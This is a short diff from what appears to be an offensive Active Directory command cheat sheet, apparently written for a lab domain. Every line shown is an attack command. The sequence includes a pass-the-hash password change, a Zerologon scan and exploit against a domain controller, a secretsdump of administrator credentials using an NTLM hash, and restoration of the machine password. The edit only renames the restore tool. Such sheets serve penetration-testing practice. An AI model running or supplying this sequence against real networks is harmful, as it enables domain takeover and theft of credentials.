@@ -168,4 +168,4 @@ pth-net rpc password someuser -U BREAKING/anotheruser%ffffffffffffffffffffffffff
 zerologon-scan DC01 192.168.56.101
 zerologon-exploit DC01 192.168.56.101
 secretsdump -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
-zerologon-recover breaking/dc01@dc01 -target-ip 192.168.56.101 -hexpass 69762...6945d
+zerologon-restore breaking/dc01@dc01 -target-ip 192.168.56.101 -hexpass 69762...6945d
